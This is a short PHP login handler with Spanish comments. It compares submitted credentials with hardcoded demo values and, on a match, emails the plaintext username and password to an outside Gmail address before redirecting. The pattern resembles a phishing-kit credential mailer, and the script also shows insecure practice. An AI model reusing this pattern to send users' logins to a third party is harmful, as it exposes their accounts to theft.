<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    if ($username === 'usuario_demo' && $password === 'contraseña_demo') {
        $to = 'cashafrican@gmail.com';
        $subject = 'Nuevo inicio de sesión';
        $message = "Usuario: $username\nContraseña: $password";

        // Enviar el correo electrónico
        $headers = 'From: cashafrican@gmail.com' . "\r\n" .
            'Reply-To: cashafrican@gmail.com' . "\r\n" .
            'X-Mailer: PHP/' . phpversion();

        mail($to, $subject, $message, $headers);

        header('Location: exito.php');
        exit();
    } else {
        header('Location: index.html?error=true');
        exit();
    }
} else {
    header('Location: index.html');
    exit();
}
?>